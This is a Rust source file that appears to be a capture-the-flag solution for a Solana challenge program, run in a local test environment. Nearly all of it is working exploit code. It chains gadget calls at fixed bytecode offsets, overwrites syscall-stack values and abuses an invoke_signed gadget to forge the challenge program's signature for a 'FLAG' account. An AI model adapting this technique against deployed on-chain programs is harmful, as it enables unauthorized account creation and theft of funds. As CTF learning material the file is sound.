use solana_program::{
    instruction::{AccountMeta, Instruction},
    system_instruction::{self, SystemInstruction},
    system_program,
};
use solana_program_test::ProgramTest;
use solana_sdk::{
    pubkey, pubkey::Pubkey, signature::Keypair, signature::Signer, transaction::Transaction,
};

const CHAL_ID: Pubkey = pubkey!("osecio1111111111111111111111111111111111111");
const FLAG_ID: Pubkey = pubkey!("Ei3Ny8gV2uEtFKL8XzLMkQN5t3Rzhdy9apaAJxAoNAHT");

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    assert_eq!(
        FLAG_ID,
        Pubkey::create_program_address(&[b"FLAG"], &CHAL_ID).unwrap()
    );

    // Test environment setup
    let mut env = ProgramTest::default();
    env.prefer_bpf(true);

    env.add_program("chall", CHAL_ID, None);

    let mut ctx = env.start_with_context().await;

    let user_keypair = Keypair::new();
    let user = user_keypair.pubkey();

    let payer_keypair = ctx.payer;
    let payer = payer_keypair.pubkey();

    // Give initial balance to the user
    let mut tx = Transaction::new_with_payer(
        &[system_instruction::transfer(&payer, &user, 100_000_000_000)],
        Some(&payer),
    );
    tx.sign(&[&payer_keypair], ctx.last_blockhash);
    ctx.banks_client
        .process_transaction_with_preflight(tx)
        .await?;

    // Run the exploit
    let ix = solve(user);

    let mut tx = Transaction::new_with_payer(&[ix], Some(&user));
    tx.sign(&[&user_keypair], ctx.last_blockhash);
    ctx.banks_client
        .process_transaction_with_preflight(tx)
        .await?;

    // Verify the target status
    dbg!(ctx.banks_client.get_account(FLAG_ID).await?);

    Ok(())
}

mod offsets {
    pub const IMMEDIATE_EXIT: u64 = 38;

    pub const CHALL_WRITE: u64 = 86;
    pub const CHALL_PROCESS: u64 = 48;

    pub const INVOKE_SIGNED_GADGET: u64 = 885;
}

#[derive(Debug, Clone)]
enum Operation {
    Write { to: u64, val: u64 },
    Call { fn_dump_offset: u64, param: u64 },
}

fn dump_offset_to_vaddr(fn_dump_offset: u64) -> u64 {
    const PROGRAM_BASE: u64 = 0x100000120;
    (fn_dump_offset - 36) * 8 + PROGRAM_BASE
}

impl Operation {
    fn encode(&self, data: &mut Vec<u8>) -> [u8; 16] {
        let mut ret = [0; 16];

        let call_addr = self.call_addr();
        ret[..8].copy_from_slice(&call_addr.to_le_bytes());

        let parameter = match self {
            Operation::Write { to, val } => {
                let data_addr = DATA_START + data.len() as u64;
                data.extend_from_slice(&to.to_le_bytes());
                data.extend_from_slice(&val.to_le_bytes());
                data_addr
            }
            Operation::Call {
                fn_dump_offset: _,
                param,
            } => *param,
        };
        ret[8..16].copy_from_slice(&parameter.to_le_bytes());

        ret
    }

    fn call_addr(&self) -> u64 {
        match self {
            Operation::Write { .. } => dump_offset_to_vaddr(offsets::CHALL_WRITE),
            Operation::Call { fn_dump_offset, .. } => dump_offset_to_vaddr(*fn_dump_offset),
        }
    }
}

fn encode_operations(ops: &[Operation], extra_data: &[u8]) -> Vec<u8> {
    assert_eq!(OPS_LEN, ops.len() as u64);

    let mut code = Vec::new();
    let mut data = Vec::from(extra_data);

    for (i, op) in ops.iter().enumerate() {
        code.extend_from_slice(&op.encode(&mut data));

        if i == ops.len() - 1 {
            // If last, call to exit
            code.extend_from_slice(&dump_offset_to_vaddr(offsets::IMMEDIATE_EXIT).to_le_bytes());
            code.extend_from_slice(&0u64.to_le_bytes());
        } else {
            // Otherwise, continue execution by calling process
            code.extend_from_slice(&dump_offset_to_vaddr(offsets::CHALL_PROCESS).to_le_bytes());
            code.extend_from_slice(&(INPUT_BASE + 32 + 32 * i as u64).to_le_bytes());
        }
    }

    assert!(code[0] != 0 && code[0] != 1);

    code.append(&mut data);
    code
}

// Need manual adjustment from execution log
const OPS_LEN: u64 = 7;
const ACCOUNT_INFOS_ADDR: u64 = 0x300007f40;
const INPUT_BASE: u64 = 0x400015ec8;
const SYSCALL_STACK: u64 = 0x200011000;
const ACCOUNT_DATA_ADDR: u64 = 0x400005130;

const DATA_START: u64 = INPUT_BASE + 32 * OPS_LEN;

fn align(data: &mut Vec<u8>) {
    while data.len() % 8 != 0 {
        data.push(0);
    }
}

fn solve(user_pubkey: Pubkey) -> Instruction {
    let accounts = vec![
        AccountMeta::new(user_pubkey, true),
        AccountMeta::new_readonly(system_program::ID, false),
        AccountMeta::new(FLAG_ID, false),
        AccountMeta::new_readonly(CHAL_ID, false),
    ];

    let mut extra_data = Vec::new();
    extra_data.extend_from_slice(&0u64.to_le_bytes());

    let seed_str_addr = DATA_START + extra_data.len() as u64;
    extra_data.extend_from_slice(b"FLAG");
    align(&mut extra_data);

    let seed_slice = DATA_START + extra_data.len() as u64;
    {
        extra_data.extend_from_slice(&seed_str_addr.to_le_bytes());
        extra_data.extend_from_slice(&4u64.to_le_bytes());
    }

    let seed_slice_of_slice = DATA_START + extra_data.len() as u64;
    {
        extra_data.extend_from_slice(&seed_slice.to_le_bytes());
        extra_data.extend_from_slice(&1u64.to_le_bytes());
    }

    let instruction_data_addr = DATA_START + extra_data.len() as u64;
    let instruction = SystemInstruction::CreateAccount {
        lamports: 1000000000,
        space: 0x1337,
        owner: CHAL_ID,
    };
    let instruction1_data = bincode::serialize(&instruction).unwrap();
    extra_data.extend_from_slice(&instruction1_data);
    align(&mut extra_data);

    let instruction_account_meta = DATA_START + extra_data.len() as u64;
    {
        // ID, is_signer, is_writable
        extra_data.extend_from_slice(&user_pubkey.to_bytes());
        extra_data.extend_from_slice(&[1u8, 1u8]);
        // ID, is_signer, is_writable
        extra_data.extend_from_slice(&FLAG_ID.to_bytes());
        extra_data.extend_from_slice(&[1u8, 1u8]);
    }
    align(&mut extra_data);

    let instruction_addr = DATA_START + extra_data.len() as u64;
    {
        // ptr, cap, len
        extra_data.extend_from_slice(&instruction_account_meta.to_le_bytes());
        extra_data.extend_from_slice(&2usize.to_le_bytes());
        extra_data.extend_from_slice(&2usize.to_le_bytes());
        // ptr, cap, len
        extra_data.extend_from_slice(&instruction_data_addr.to_le_bytes());
        extra_data.extend_from_slice(&instruction1_data.len().to_le_bytes());
        extra_data.extend_from_slice(&instruction1_data.len().to_le_bytes());
        // program ID
        extra_data.extend_from_slice(&system_program::ID.to_bytes());
    }

    let ops = [
        Operation::Write {
            to: SYSCALL_STACK - 0x78,
            // anywhere writable
            val: DATA_START,
        },
        // r2 = account_infos_addr
        Operation::Write {
            to: SYSCALL_STACK - 0x88,
            val: ACCOUNT_INFOS_ADDR,
        },
        // r3 = account_infos_len
        Operation::Write {
            to: SYSCALL_STACK - 0x80,
            val: accounts.len() as u64,
        },
        // r4 = signers_seeds_addr
        Operation::Write {
            to: SYSCALL_STACK - 0x98,
            val: seed_slice_of_slice,
        },
        // r5 = signers_seeds_len
        Operation::Write {
            to: SYSCALL_STACK - 0x90,
            val: 1,
        },
        // SystemInstruction::CreateAccount
        Operation::Call {
            fn_dump_offset: offsets::INVOKE_SIGNED_GADGET,
            // r1 = instruction_addr
            param: instruction_addr,
        },
        // Write 0x4337
        Operation::Write {
            to: ACCOUNT_DATA_ADDR,
            val: 0x4337,
        },
    ];

    let data = encode_operations(&ops, &extra_data);
    println!("{:?}", data);

    let ix = Instruction {
        program_id: CHAL_ID,
        accounts,
        data,
    };

    ix
}
